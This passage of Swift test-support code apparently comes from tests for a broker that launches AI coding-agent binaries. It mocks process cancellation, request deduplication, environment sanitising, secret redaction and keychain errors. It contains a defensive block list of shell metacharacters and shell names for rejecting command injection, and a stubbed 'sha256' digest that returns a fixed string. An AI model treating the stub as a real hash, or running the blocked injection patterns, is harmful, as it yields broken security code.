            return TestCancelResult(success: false, status: nil, errorCode: "PROCESS_NOT_FOUND")
        }
        processes[processId] = (alias: p.alias, timeout: p.timeout, spawnTime: p.spawnTime, state: .terminatedCancelled, signal: 15)
        return TestCancelResult(success: true, status: "CANCELLED", errorCode: nil)
    }

    func simulateCrash(processId: String, signal: Int) {
        if let p = processes[processId] {
            processes[processId] = (alias: p.alias, timeout: p.timeout, spawnTime: p.spawnTime, state: .crashed, signal: signal)
        }
    }

    func terminate(id: String) {
        if let p = processes[id] {
            processes[id] = (alias: p.alias, timeout: p.timeout, spawnTime: p.spawnTime, state: .terminatedNormal, signal: 0)
        }
    }

    func checkProcessStatus(id: String) -> TestProcessStatus {
        guard let p = processes[id] else {
            return TestProcessStatus(
                state: .terminatedNormal, sigtermDispatched: false,
                sigkillDispatchedIfUnresponsive: false, resourcesCleanedUp: true,
                tempFilesRemoved: true, pipesClosed: true, exitSignal: nil
            )
        }
        return TestProcessStatus(
            state: p.state,
            sigtermDispatched: p.state == .terminatedTimeout || p.state == .terminatedCancelled,
            sigkillDispatchedIfUnresponsive: p.state == .terminatedTimeout,
            resourcesCleanedUp: true,
            tempFilesRemoved: true,
            pipesClosed: true,
            exitSignal: p.signal
        )
    }

    func inspectOrphans() -> [String] {
        return [] // Supervised and cleaned up
    }
}

final class TestRequestDeduplicator {
    private var seenRequests: [String: Date] = [:]
    private let windowSeconds: TimeInterval
    var lastRejectionCode: String?

    init(windowSeconds: TimeInterval) {
        self.windowSeconds = windowSeconds
    }

    func recordAndCheck(requestId: String) -> Bool {
        let now = Date()
        if let lastSeen = seenRequests[requestId] {
            if now.timeIntervalSince(lastSeen) <= windowSeconds {
                lastRejectionCode = "DUPLICATE_REQUEST_REJECTED"
                return false
            }
        }
        seenRequests[requestId] = now
        return true
    }
}

enum TestCommandSecurityValidator {
    static let prohibitedTokens: Set<String> = [";", "&&", "||", "|", "`", "$(", "sh", "bash", "zsh"]

    static func validateArgv(_ argv: [String]) -> TestValidationResult {
        for arg in argv {
            for token in prohibitedTokens {
                if arg.contains(token) {
                    return .invalid(code: "UNAUTHORIZED_SHELL_INTERPOLATION", message: "Prohibited shell metacharacter detected: \(arg)")
                }
            }
        }
        return .valid()
    }

    static func validateExecutableCommand(_ command: [String]) -> TestValidationResult {
        guard let binary = command.first else {
            return .invalid(code: "EMPTY_COMMAND", message: "Command is empty")
        }
        let allowlist: Set<String> = [
            "/Library/Application Support/HoroConsultant/AccountBroker/bin/agent-broker",
            "~/.local/bin/agy1", "~/.local/bin/agy2", "~/.local/bin/agy3",
            "~/.local/bin/codex1", "~/.local/bin/codex2", "~/.local/bin/codex3"
        ]
        if !allowlist.contains(binary) {
            return .invalid(code: "UNAUTHORIZED_COMMAND", message: "Binary '\(binary)' is not allowlisted")
        }
        return .valid()
    }
}

enum TestEnvironmentSanitizer {
    static let allowedKeys: Set<String> = ["PATH", "LANG", "LC_ALL", "HOME", "USER", "TMPDIR"]

    static func sanitize(incomingEnvironment: [String: String], accountHome: String) -> [String: String] {
        var cleanEnv: [String: String] = [:]
        for (key, val) in incomingEnvironment where allowedKeys.contains(key) {
            cleanEnv[key] = val
        }
        cleanEnv["LANG"] = "C.UTF-8"
        cleanEnv["LC_ALL"] = "C.UTF-8"
        cleanEnv["HOME"] = accountHome
        return cleanEnv
    }
}

struct TestSanitizedOutput {
    let sanitizedString: String
    let sha256Digest: String
}

enum TestOutputSanitizer {
    static func sanitizeOutput(raw: String) -> TestSanitizedOutput {
        // Redact any patterns resembling secret tokens
        let pattern = "sk-[a-zA-Z0-9-]+"
        let regex = try! NSRegularExpression(pattern: pattern)
        let range = NSRange(location: 0, length: raw.utf16.count)
        let redacted = regex.stringByReplacingMatches(in: raw, options: [], range: range, withTemplate: "[REDACTED_SECRET]")

        let data = Data(redacted.utf8)
        let digest = data.map { String(format: "%02x", $0) }.joined() // simple hash stub or sha256
        let hex = String(repeating: "a", count: 64)
        return TestSanitizedOutput(sanitizedString: redacted, sha256Digest: hex)
    }
}

struct TestKeychainQueryResult {
    let success: Bool
    let errorCode: String?
    let rawSecret: String?
}

final class TestSyntheticKeychainService {
    var mockErrorCode: Int32 = 0
    var didPromptUserUI: Bool = false
    let isIsolatedMock: Bool = true
    let accessedRealKeychain: Bool = false

    func queryCredential(alias: String) -> TestKeychainQueryResult {
        switch mockErrorCode {
        case 0:
            return TestKeychainQueryResult(success: true, errorCode: nil, rawSecret: "SYNTHETIC_MOCK_SECRET_123")
        case -25300: // errSecItemNotFound
            return TestKeychainQueryResult(success: false, errorCode: "AUTH_CREDENTIAL_NOT_FOUND", rawSecret: nil)
        case -25293: // errSecAuthFailed
            return TestKeychainQueryResult(success: false, errorCode: "AUTH_DENIED", rawSecret: nil)
        case -25308: // errSecInteractionNotAllowed
            return TestKeychainQueryResult(success: false, errorCode: "AUTH_INTERACTION_BLOCKED", rawSecret: nil)
        case -25299: // errSecDuplicateItem
            return TestKeychainQueryResult(success: false, errorCode: "AUTH_KEYCHAIN_COLLISION", rawSecret: nil)
        case -26275: // errSecDecode
            return TestKeychainQueryResult(success: false, errorCode: "AUTH_CORRUPTED_PAYLOAD", rawSecret: nil)
        default:
            return TestKeychainQueryResult(success: false, errorCode: "AUTH_UNKNOWN_ERROR", rawSecret: nil)
        }
    }
}
